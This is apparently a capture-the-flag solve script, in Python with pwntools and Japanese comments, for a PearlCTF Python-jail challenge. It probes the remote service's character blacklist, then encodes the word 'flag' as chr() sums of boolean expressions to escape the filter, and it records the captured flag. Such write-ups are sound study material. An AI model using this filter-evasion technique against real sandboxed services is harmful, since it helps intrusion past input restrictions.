from pwn import *

# io = process(["python", "source.py"])
io = remote("dyn.ctf.pearlctf.in", "30016")


# ****************************************************
# blackbox 特定
# ****************************************************
def is_avaiable(str):
    io = remote("dyn.ctf.pearlctf.in", "30016")
    payload = '"' + "'" + str + "'" + '"'
    io.sendlineafter(b">>>", payload.encode())
    is_avaiable = b"Your sentence has been" not in io.recvline()
    io.close()
    return is_avaiable


# printable を試して以下が使えることが判明
assert is_avaiable("( ) + - = ? \ ` a c h q r w |")


# ****************************************************
# flag 取得
# ****************************************************
def make_chr(c):
    expr = "+".join(["(''=='')"] * ord(c))
    return f"chr({expr})"


def make_str(s):
    return "+".join([make_chr(c) for c in s])


cmd = make_str("flag")
io.sendlineafter(b">>>", cmd.encode())
io.interactive()
# pearl{j41l_3sc4p3_succ3sful_362de4}
